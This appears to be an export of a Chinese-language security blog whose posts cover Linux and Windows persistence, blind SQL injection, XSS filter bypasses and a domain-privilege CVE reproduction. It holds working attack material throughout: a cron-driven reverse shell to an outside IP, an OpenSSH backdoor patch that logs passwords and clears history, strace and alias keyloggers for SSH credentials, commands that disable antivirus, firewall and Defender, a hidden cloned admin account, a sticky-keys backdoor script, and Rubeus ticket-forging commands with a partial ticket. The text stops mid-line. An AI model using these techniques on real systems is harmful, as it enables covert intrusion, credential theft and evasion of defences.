<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.28.131/12345 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><code>chmod +sx etc/test.sh</code></p>
<ul>
<li>crontab -e 设置定时任务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 每分钟执行一次</span><br><span class="line">*/1 * * * * root /etc/test.sh</span><br></pre></td></tr></table></figure>

<p>重启crond服务就可用nc接受shell <code>service cornd restart</code></p>
<h5 id="排查-4"><a href="#排查-4" class="headerlink" title="排查"></a>排查</h5><p>查看可疑的定时任务列表</p>
<p><code>crontab -e</code></p>
<br>

<h4 id="0x06-OpenSSH-后门"><a href="#0x06-OpenSSH-后门" class="headerlink" title="0x06 OpenSSH 后门"></a>0x06 OpenSSH 后门</h4><h5 id="使用-4"><a href="#使用-4" class="headerlink" title="使用"></a>使用</h5><p>利用openssh后门，设置SSH后门密码及root密码记录位置，隐蔽性较强，不易被发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a、备份SSH配置文件</span><br><span class="line">mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old</span><br><span class="line">mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old</span><br><span class="line">b、解压并安装补丁</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">cp openssh-5.9p1.patch/sshbd5.9p1.diff /openssh-5.9p1</span><br><span class="line">cd openssh-5.9p1</span><br><span class="line">patch &lt; sshbd5.9p1.diff</span><br><span class="line">c、记录用户名和密码的文件位置及其密码</span><br><span class="line">vi includes.h</span><br><span class="line">#define ILOG &quot;/tmp/1.txt&quot;           //记录登录本机的用户名和密码</span><br><span class="line">#define OLOG &quot;/tmp/2.txt&quot;           //记录本机登录远程的用户名和密码</span><br><span class="line">#define SECRETPW &quot;123456789&quot;        //后门的密码</span><br><span class="line">d、修改版本信息</span><br><span class="line">vi version.h</span><br><span class="line">#define SSH_VERSION &quot;填入之前记下来的版本号,伪装原版本&quot;</span><br><span class="line">#define SSH_PORTABLE &quot;小版本号&quot;</span><br><span class="line">e、安装并编译</span><br><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5</span><br><span class="line">make clean</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">service sshd restart</span><br><span class="line">f、对比原来的配置文件，使配置文件一致，然后修改文件日期。</span><br><span class="line">touch -r /etc/ssh/ssh_config.old /etc/ssh/ssh_config</span><br><span class="line">touch -r /etc/ssh/sshd_config.old /etc/ssh/sshd_config</span><br><span class="line">g、清除操作记录</span><br><span class="line">export HISTFILE=/dev/null</span><br><span class="line">export HISTSIZE=0</span><br><span class="line">echo &gt;/root/.bash_history //清空操作日志</span><br></pre></td></tr></table></figure>

<h5 id="排查-5"><a href="#排查-5" class="headerlink" title="排查"></a>排查</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#利用strace查找ssh后门</span><br><span class="line"># 1、获取可疑进程PID</span><br><span class="line">ps aux | grep sshd</span><br><span class="line"># 2、跟踪sshd PID</span><br><span class="line">strace -o aa -ff -p PID</span><br><span class="line"># 3、查看记录密码打开文件</span><br><span class="line">grep open sshd* | grep -v -e No -e null -e denied| grep WR</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="0x07-strace后门"><a href="#0x07-strace后门" class="headerlink" title="0x07 strace后门"></a>0x07 strace后门</h4><p>strace是一个动态跟踪工具，它可以跟踪系统调用的执行。我们可以把它当作一个键盘记录的后门，来扩大我们的信息收集范围。通过其他方式拿到shell，通过histroy，流量抓包、或者本地没有翻到密码的情况下。我们要想获取当前<br>主机的密码，或者是通过这台主机连接到其他主机的密码。</p>
<h5 id="记录sshd进程明文密码"><a href="#记录sshd进程明文密码" class="headerlink" title="记录sshd进程明文密码"></a>记录sshd进程明文密码</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(strace -f -F -p `ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#x27;print $2&#x27;&#125;` -t -e</span><br><span class="line">trace=read,write -s 32 2&gt; /tmp/.sshd.log &amp;)</span><br></pre></td></tr></table></figure>

<p>当用户通过密码登陆时，使用如下命令查看记录的密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep -E &#x27;read\(6, &quot;.+\\0\\0\\0\\.+&quot;&#x27; /tmp/.sshd.log</span><br></pre></td></tr></table></figure>

<h5 id="记录sshd私钥"><a href="#记录sshd私钥" class="headerlink" title="记录sshd私钥"></a>记录sshd私钥</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(strace -f -F -p `ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#x27;print $2&#x27;&#125;` -t -e</span><br><span class="line">trace=read,write -s 4096 2&gt; /tmp/.sshd.log &amp;)</span><br></pre></td></tr></table></figure>

<p>当用户通过私钥登陆时，使用如下命令查看记录的私钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &#x27;PRIVATE KEY&#x27; /tmp/.sshd.log</span><br></pre></td></tr></table></figure>

<h5 id="通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。"><a href="#通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。" class="headerlink" title="通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。"></a>通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#vim /etc/bashrc或者 ~/.bashrc</span><br><span class="line">alias ssh=&#x27;strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh&#x27;</span><br><span class="line"># source ~/.bashrc</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>权限维持</category>
      </categories>
      <tags>
        <tag>权限维持</tag>
      </tags>
  </entry>
  <entry>
    <title>权限维持-Windows篇(待完成)</title>
    <url>/posts/709e0d6/</url>
    <content><![CDATA[<h3 id="Windows权限维持"><a href="#Windows权限维持" class="headerlink" title="Windows权限维持"></a>Windows权限维持</h3><h4 id="隐藏技巧"><a href="#隐藏技巧" class="headerlink" title="隐藏技巧"></a>隐藏技巧</h4><h5 id="文件隐藏"><a href="#文件隐藏" class="headerlink" title="文件隐藏"></a>文件隐藏</h5><p><code>attrib +s +a +h +r c:\test</code></p>
<p>把原本的⽂件夹增加了系统⽂件属性、存档⽂件属性、只读⽂件属性和隐藏⽂件属性。</p>
<h5 id="系统文件夹图标"><a href="#系统文件夹图标" class="headerlink" title="系统文件夹图标"></a>系统文件夹图标</h5><h6 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h6><ul>
<li>1.新建文件夹 并将文件存入</li>
<li>2.修改命名为 我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D} 然后访问该文件夹，打开会打开我的电脑</li>
<li>3.如果需要查看内容 可以使用winrar 等去查看或 恢复</li>
</ul>
<h6 id="代号"><a href="#代号" class="headerlink" title="代号"></a>代号</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我的电脑.&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;</span><br><span class="line">回收站.&#123;645ff040-5081-101b-9f08-00aa002f954e&#125;</span><br><span class="line">拔号⽹络.&#123;992CFFA0-F557-101A-88EC-00DD010CCC48&#125;</span><br><span class="line">打印机.&#123;2227a280-3aea-1069-a2de-08002b30309d&#125;</span><br><span class="line">控制⾯板.&#123;21ec2020-3aea-1069-a2dd-08002b30309d&#125;</span><br><span class="line">⽹上邻居.&#123;208D2C60-3AEA-1069-A2D7-08002B30309D&#125;</span><br></pre></td></tr></table></figure>

<h5 id="畸形目录"><a href="#畸形目录" class="headerlink" title="畸形目录"></a>畸形目录</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建目录</span><br><span class="line">md a...\      //三个点,实际显示为 a..</span><br><span class="line">#复制文件</span><br><span class="line">copy test a...\test</span><br><span class="line">#删除目录</span><br><span class="line">rd /s /q a...\</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="利用系统保留文件名创建无法删除的webshell"><a href="#利用系统保留文件名创建无法删除的webshell" class="headerlink" title="利用系统保留文件名创建无法删除的webshell"></a>利用系统保留文件名创建无法删除的webshell</h5><p>（注: 火绒就可以粉碎…）</p>
<p>Windows 下不能够以下面这些字样来命名文件/文件夹，包括：aux，com1，com2，prn，con和nul等，但是通过cmd下是可以创建此类文件夹的，使用copy命令即可实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 方法</span><br><span class="line">copy 1.jsp   \\.\E:\test\aux.jsp</span><br><span class="line">del \\.\E:\test\aux.jsp</span><br><span class="line">type \\.\E:\test\aux.jsp</span><br><span class="line"></span><br><span class="line">#可以使用attrib隐藏文件 </span><br><span class="line">#这种在设置显示隐藏文件后/dir  也无法看到</span><br><span class="line">attrib 1.txt //查看⽂件属性 </span><br><span class="line">attrib 1.txt -r -s //删除⽂件属性</span><br><span class="line">attrib +H +S 1.asp 改变⽂件属性，隐藏1.asp</span><br><span class="line">attrib -H -S 1.asp </span><br></pre></td></tr></table></figure>

<h5 id="驱动级文件隐藏"><a href="#驱动级文件隐藏" class="headerlink" title="驱动级文件隐藏"></a>驱动级文件隐藏</h5><p>可以利用 <code>Easy File Locker </code> 对文件夹进行隐藏</p>
<p> 下载链接： <a href="http://www.xoslab.com/efl.html">http://www.xoslab.com/efl.html</a></p>
<br>

<br>

<h4 id="关闭杀软"><a href="#关闭杀软" class="headerlink" title="关闭杀软"></a>关闭杀软</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//meterperter中使用</span><br><span class="line">run killav </span><br><span class="line">//关闭防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off </span><br><span class="line">//关闭windowsdefender</span><br><span class="line">net stop windefend </span><br></pre></td></tr></table></figure>

<p>还有几个大佬github上关杀软的项目</p>
<p><a href="https://github.com/Yaxser/Backstab">https://github.com/Yaxser/Backstab</a></p>
<p><a href="https://github.com/Yihsiwei/GetOut360">https://github.com/Yihsiwei/GetOut360</a></p>
<br>

<h4 id="影子用户"><a href="#影子用户" class="headerlink" title="影子用户"></a>影子用户</h4><h5 id="1-创建隐藏账户"><a href="#1-创建隐藏账户" class="headerlink" title="1.创建隐藏账户"></a>1.创建隐藏账户</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建完成后仍可以通过计算机管理和登录处看到该用户</span><br><span class="line">net user test$ Test.123 /add</span><br><span class="line">net localgroup administrators test$ /add</span><br></pre></td></tr></table></figure>

<h5 id="2-打开注册表-regedit-修改权限"><a href="#2-打开注册表-regedit-修改权限" class="headerlink" title="2.打开注册表 regedit 修改权限"></a>2.打开注册表 regedit 修改权限</h5><p><code>HKEY_LOCAL_MACHINE\SAM\SAM</code> 的adminstrator权限修改为完全控制和读取，然后重新打开注册表便可继续查看内容</p>
<h5 id="3-导出test-账户的reg-和-对应类型（0xXX的那个文件）和administrator对应十六进制的注册表"><a href="#3-导出test-账户的reg-和-对应类型（0xXX的那个文件）和administrator对应十六进制的注册表" class="headerlink" title="3.导出test$账户的reg 和 对应类型（0xXX的那个文件）和administrator对应十六进制的注册表"></a>3.导出test$账户的reg 和 对应类型（0xXX的那个文件）和administrator对应十六进制的注册表</h5><p>路径为<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code></p>
<h5 id="4-将test-对应的00000XXX-reg的-F值替换为administrator-对应00000XXX-reg的F值"><a href="#4-将test-对应的00000XXX-reg的-F值替换为administrator-对应00000XXX-reg的F值" class="headerlink" title="4.将test$对应的00000XXX.reg的 F值替换为administrator 对应00000XXX.reg的F值"></a>4.将test$对应的00000XXX.reg的 F值替换为administrator 对应00000XXX.reg的F值</h5><h5 id="5-删除test-用户"><a href="#5-删除test-用户" class="headerlink" title="5.删除test$用户"></a>5.删除test$用户</h5><p><code>net user test$ /del</code>  （删除后注册表里的test$用户就无法打开了）</p>
<h5 id="6-在cmd导入test-的两个注册表"><a href="#6-在cmd导入test-的两个注册表" class="headerlink" title="6.在cmd导入test$的两个注册表"></a>6.在cmd导入test$的两个注册表</h5><p>(这样就不会在计算机管理和登录页面看到创建的账户了，但仍可以在组成不SAM下看到,登录后会在计算机管理中显示该用户，想要清除该用户需要在注册表清除)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">regedit  /s 1.reg</span><br><span class="line">regedit  /s 2.reg</span><br></pre></td></tr></table></figure>

<h5 id="7-使用3389登录-会-登陆到administrator-的当前状态下-实现adminstrator账户的克隆"><a href="#7-使用3389登录-会-登陆到administrator-的当前状态下-实现adminstrator账户的克隆" class="headerlink" title="7.使用3389登录 会 登陆到administrator 的当前状态下 实现adminstrator账户的克隆"></a>7.使用3389登录 会 登陆到administrator 的当前状态下 实现adminstrator账户的克隆</h5><br>

<h4 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h4><p>win+R    gpedit.msc 打开本地组策略编辑器<br>选择计算机管理-&gt;WIndows设置-&gt;脚本(启动/关闭)  选择启动或关闭 添加bat脚本</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">net user test<span class="variable">$</span> Test.<span class="number">123</span> /add</span><br><span class="line">net localgroup administrators test<span class="variable">$</span> /add</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<br>

<h4 id="粘滞键后门"><a href="#粘滞键后门" class="headerlink" title="粘滞键后门"></a>粘滞键后门</h4><h5 id="Shiftkey"><a href="#Shiftkey" class="headerlink" title="Shiftkey"></a>Shiftkey</h5><p><code>Set-ExecutionPolicy Unrestricted</code></p>
<p><code>Import-Module .\shiftkey.ps1</code></p>
<p>运行一次会启动 再次运行会删除<br>在用户登录下为当前用户权限，在登录界面为system权限</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$registryPath</span> = <span class="string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\&quot;</span> </span><br><span class="line"><span class="variable">$keyName</span> = <span class="string">&quot;sethc.exe&quot;</span> </span><br><span class="line"><span class="variable">$stringName</span> = <span class="string">&quot;Debugger&quot;</span> </span><br><span class="line"><span class="variable">$binaryValue</span> = <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span></span><br><span class="line"><span class="keyword">IF</span> (<span class="built_in">Test-Path</span> (<span class="variable">$registryPath</span> + <span class="variable">$keyName</span>)) </span><br><span class="line">&#123;</span><br><span class="line">      <span class="comment"># Sticky Keys backdoor exists.    </span></span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Registry key found. Let&#x27;s remove it.&quot;</span>    </span><br><span class="line">     <span class="comment">#New-Item -Path $registryPath -Name $keyName | Out-Null    </span></span><br><span class="line">     <span class="built_in">Remove-Item</span> <span class="literal">-Path</span> (<span class="variable">$registryPath</span> + <span class="variable">$keyName</span>) | <span class="built_in">Out-Null</span>    </span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Sticky Key backdoor has been removed.&quot;</span>    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">ELSE</span> </span><br><span class="line">&#123;    </span><br><span class="line">     <span class="comment"># Sticky Keys backdoor does not exist, let&#x27;s add it.    </span></span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Registry key not found. Attempting to add Sticky Keys backdoor to registry.&quot;</span>    </span><br><span class="line">     <span class="built_in">New-Item</span> <span class="literal">-Path</span> <span class="variable">$registryPath</span> <span class="literal">-Name</span> <span class="variable">$keyName</span> | <span class="built_in">Out-Null</span>    </span><br><span class="line">     <span class="built_in">New-ItemProperty</span> <span class="literal">-Path</span> (<span class="variable">$registryPath</span> + <span class="variable">$keyName</span>) <span class="literal">-Name</span> <span class="variable">$stringName</span> <span class="literal">-Value</span> <span class="variable">$binaryValue</span> | <span class="built_in">Out-Null</span>     </span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Sticky Keys backdoor added.&quot;</span>     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<h4 id="劫持后门"><a href="#劫持后门" class="headerlink" title="劫持后门"></a>劫持后门</h4><br>

<h4 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h4><br>

<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><br>

<h4 id="新服务"><a href="#新服务" class="headerlink" title="新服务"></a>新服务</h4><br>

<h4 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h4>]]></content>
      <categories>
        <category>权限维持</category>
      </categories>
      <tags>
        <tag>权限维持</tag>
      </tags>
  </entry>
  <entry>
    <title>2022杂记</title>
    <url>/posts/9577635b/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="aabcab508b11d0a992952cd21e4d8f2ccbd50f495513e48e0933dcc7f552a6d5"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>杂记</category>
      </categories>
      <tags>
        <tag>杂记</tag>
      </tags>
  </entry>
  <entry>
    <title>Regexp注入</title>
    <url>/posts/6cc02bf9/</url>
    <content><![CDATA[<p>直接查询自己需要的数据，然后通过正则表达式进行匹配 用于盲注中</p>
<br>

<p>regexp ‘^[a-z]’ 判断一个表的第一个字符串是否在a-z中</p>
<p><code>and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;security&quot; AND table_name REGEXP &#39;^[a-z]&#39; LIMIT 0,1) </code>    # 判断第一个字符是不是 a-z</p>
<br>

<p>regexp ‘^e’ 判断第一个字符串是否为e</p>
<p><code>and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;security&quot; AND table_name REGEXP &#39;^e&#39; LIMIT 0,1) </code> # 判断第一个字符是不是 e</p>
<br>

<p>regexp ‘^e[a-z]’ 判断一个表的第二个字符串是否在a-z中</p>
<p><code>and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;security&quot; AND table_name REGEXP &#39;^e[a-z]&#39; LIMIT 0,1)</code></p>
]]></content>
  </entry>
  <entry>
    <title>信息收集可能会用到的站点</title>
    <url>/posts/4259031d/</url>
    <content><![CDATA[<p>国家企业信用信息公示系统 网址：<a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a><br>香港查册中心网址：<a href="https://www.icris.cr.gov.hk/csci/">https://www.icris.cr.gov.hk/csci/</a><br>台湾商工行政务服务入口网<a href="https://findbiz.nat.gov.tw/fts/query/QueryBar/queryInit.do">https://findbiz.nat.gov.tw/fts/query/QueryBar/queryInit.do</a><br>英国工商信息<a href="https://www.gov.uk/government/organisations/companies-house">https://www.gov.uk/government/organisations/companies-house</a><br>美国工商信息网址：<a href="http://www.wysk.com/index/">http://www.wysk.com/index/</a><br>新加坡工商信息网站：<a href="https://www.acra.gov.sg/home/">https://www.acra.gov.sg/home/</a><br>澳大利亚工商信息网址：<a href="http://abr.business.gov.au/">http://abr.business.gov.au</a><br>印度工商信息 网址：<a href="http://www.mca.gov.in/">http://www.mca.gov.in</a><br>第三方企业查询网站  网址：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a><br>企查查 网址：<a href="https://www.qcc.com/">https://www.qcc.com/</a><br>爱企查 网址：<a href="https://www.qcc.com/">https://www.qcc.com/</a><br>启信宝  网址：<a href="https://www.qixin.com/">https://www.qixin.com/</a><br>Opencorporates 网址：<a href="https://opencorporates.com/">https://opencorporates.com/</a> 可查询全球公司基本工商信息。<br>Google  <a href="https://www.google.co.jp/">https://www.google.co.jp/</a><br>百度 网址：<a href="https://www.baidu.com/">https://www.baidu.com/</a></p>
]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次XXS绕过学习</title>
    <url>/posts/b6714d8e/</url>
    <content><![CDATA[<p>参考原文 <a href="https://mp.weixin.qq.com/s/ZCWdfnObwBkHUR8he6XxlA">https://mp.weixin.qq.com/s/ZCWdfnObwBkHUR8he6XxlA</a></p>
<h3 id="alert绕过"><a href="#alert绕过" class="headerlink" title="alert绕过"></a>alert绕过</h3><p>alert(1)   — &gt;    a=alert;a(1) </p>
<br>

<h3 id="事件拦截绕过"><a href="#事件拦截绕过" class="headerlink" title="事件拦截绕过"></a>事件拦截绕过</h3><p><code>&lt;input type=&quot;text&quot; pattern=&quot;a&quot;  oninvalid=&quot;alert(1)&quot; /&gt; </code></p>
<p>oninvalid事件会以正则表达式去判断pattern的值，如果输入框内的值不全等余“a” </p>
<p><code>&lt;input type=&quot;text&quot; pattern=&quot;a&quot;  oninvalid=&quot;a=alert;a(1)&quot; /&gt;</code></p>
<br>

<h3 id="disable属性绕过"><a href="#disable属性绕过" class="headerlink" title="disable属性绕过"></a>disable属性绕过</h3><p>disable=”disable”  —&gt; a=”disable=”disable”</p>
<br>

<br>

<br>

<p>xss 插入的 type 即是 text 又是 submit，在文本框中按回车即可触发</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xss&quot;</span> <span class="attr">oninvalid</span>=<span class="string">a</span>=<span class="string">alert;a(1)</span> <span class="attr">pattern</span>=<span class="string">&quot;a&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">a</span>=<span class="string">&quot; disabled=&quot;</span><span class="attr">disabled</span>&quot; <span class="attr">style</span>=<span class="string">&quot;margin-top: 1px;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>CVE-2021-42287/CVE-2021-42278复现</title>
    <url>/posts/1fd95242/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>CVE-2021-42278，机器账户的名字一般来说应该以$结尾，但AD没有对域内机器账户名做验证。</p>
<p>CVE-2021-42287，与上述漏洞配合使用，创建与DC机器账户名字相同的机器账户（不以$结尾），账户请求一个TGT后，更名账户，然后通过S4U2self申请TGS Ticket，接着DC在TGS_REP阶段，这个账户不存在的时候，DC会使用自己的密钥加密TGS Ticket，提供一个属于该账户的PAC，然后我们就得到了一个高权限ST。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/Z3mI5eEc8-iudqdU7EZ3EQ">https://mp.weixin.qq.com/s/Z3mI5eEc8-iudqdU7EZ3EQ</a> </p>
<p><a href="https://www.cnblogs.com/mrhonest/p/15682858.html">https://www.cnblogs.com/mrhonest/p/15682858.html</a></p>
<p><a href="https://heibai.org.cn/2071.html">https://heibai.org.cn/2071.html</a></p>
<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>域内普通用户</p>
<p><code>lab\user01 </code>  / <code>Test.123</code></p>
<p>Win2008</p>
<p>Win2012</p>
<h3 id="复现踩坑"><a href="#复现踩坑" class="headerlink" title="复现踩坑"></a><em>复现</em>踩坑</h3><h4 id="创建域用户hello"><a href="#创建域用户hello" class="headerlink" title="创建域用户hello"></a>创建域用户hello</h4><p>这里使用一个域内普通用户进行登录  下载Powermad.ps1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount hello -Domain lab.com -DomainController DC01.lab.com -Verbose</span><br></pre></td></tr></table></figure>

<p><img src="/posts/1fd95242/1.png" alt="截图"></p>
<p><img src="/posts/1fd95242/2.png" alt="截图"></p>
<p>成功创建用户test</p>
<h4 id="删除spn记录"><a href="#删除spn记录" class="headerlink" title="删除spn记录"></a>删除spn记录</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powerview.ps1</span><br><span class="line">Set-DomainObject &quot;CN=hello,CN=Computers,DC=lab,DC=com&quot;  -Clear &#x27;serviceprincipalname&#x27; -Verbose</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先用<code>setspn</code>查一下 </p>
<p><code>setspn -Q */* | findstr hola</code></p>
<p><img src="/posts/1fd95242/3.png" alt="截图"></p>
<br>

<p>这里 我另起了一个powershell去引用桌面上的cmd 结果会报错 ，然后把powerview放在Powermad同目录下导入就不报错了…. （不知道为啥…）</p>
<p><img src="/posts/1fd95242/4.png" alt="截图"></p>
<p>移动后就正常了</p>
<p><img src="/posts/1fd95242/5.png" alt="截图"></p>
<p>(<del>在win2012powershell下 Set-DomainObject没有这个东西？？？！！！)…</del></p>
<p>发现两个powerview.ps1 大小不一样 不是同一个 服了…… 一个700+K 一个300+K</p>
<p>然后去尝试删除spn 。。。</p>
<p><img src="/posts/1fd95242/6.png" alt="截图"></p>
<br>

<h4 id="重设机器名"><a href="#重设机器名" class="headerlink" title="重设机器名"></a>重设机器名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount hello -Value &quot;DC01&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>

<p>改为域控名</p>
<p><img src="/posts/1fd95242/7.png" alt="截图"></p>
<h4 id="请求TGT"><a href="#请求TGT" class="headerlink" title="请求TGT"></a>请求TGT</h4><p><del>win2008下使用Rubeus.exe报错.......$#%@&amp;@!#@!…….</del></p>
<p><del>去github上下载下来编译一下 然后在win2008上运行 说缺少.net4.0 然后去下载下来安装，结果安装超时了，这台机器的网络…</del></p>
<p>后面找了个 .net4.5免安装版就可用去使用Rebues。。。。</p>
<br>

<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><h4 id="创建机器用户hello"><a href="#创建机器用户hello" class="headerlink" title="创建机器用户hello"></a>创建机器用户hello</h4><h4 id="删除spn记录-1"><a href="#删除spn记录-1" class="headerlink" title="删除spn记录"></a>删除spn记录</h4><p><img src="/posts/1fd95242/8.png" alt="截图"></p>
<h4 id><a href="#" class="headerlink" title></a></h4><h4 id="重新设置机器名"><a href="#重新设置机器名" class="headerlink" title="重新设置机器名"></a>重新设置机器名</h4><p><img src="/posts/1fd95242/9.png" alt="截图"></p>
<br>

<h4 id="请求TGT-1"><a href="#请求TGT-1" class="headerlink" title="请求TGT"></a>请求TGT</h4><p><img src="/posts/1fd95242/10.png" alt="截图"></p>
<br>

<h4 id="恢复原来的机器属性"><a href="#恢复原来的机器属性" class="headerlink" title="恢复原来的机器属性"></a>恢复原来的机器属性</h4><p><img src="/posts/1fd95242/11.png" alt="截图"></p>
<br>

<h4 id="获取票据"><a href="#获取票据" class="headerlink" title="获取票据"></a>获取票据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:DC01.lab.com /self /altservice:LDAP/DC01.lab.com  /ptt /ticket:doIElDCCBJCgAwIBBaEDAgEWooIDvDCCA7hhggO0MIIDsKADAgEFoQkbB0xBQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2xhYi5jb22jggN+MIIDeqADAgESoQMCAQKiggNsBIIDaIW9iHW2Vv1XWw71Yc6V1rdL7m2Mwmzw+rj6X1OQqR1lNapte8JpgGMN/EW+0FWCqpkFBYYR0q+ljSY56LIpTNSYK2V4ZEPmBTv/iZtG3rvGdHafJxyD3b/GfWSVLt3c1Ev7LGf9mUP/tDzsxQ46mDgdbUiuB5B7/z9vaj7h71J8M2bkIUfeP4xgNcxR5PvLbQsyp6KE54WXRxpreU4ibz8vsplH3i8sKzrPFRM1w7m2XFBonMc1A3oElU16aHwIsDUew60eRa/wqAkIl9cmO7d/hSux+7aM7ta7Q3+JfnyOYjl0BQMbzK+gDdqtdcgkycjG/W/+EPbqUHin8wKrY3O8SHix2K1Dq0VIp+GegeiiSlLvk7q+1CixSbo2DxSFAkKDyTUx8YfqSTLzy6scD4Hyi8GSVZCNf2vCTL8KFpSHyPtMURaZitv5YOmBVlK0gq73cKTst6cGzCN0h9XLVOm+RGbjLShOWpsJ4P+9pKLS12PN9EgughEHbCen0Hv2dXLfe+dwDL6Gd5A+TYbsNIyfHrxLhcdu6H1bW6cKSZaXfASM/1RyXUA15O0b0y5uh8PpQd82ptvckHkSa2gHqamM08UsUs60H5OPzGRSvtNskOHgFkDYcX6MgKJNFOq+g+J/EKchSS0yIc</span><br><span 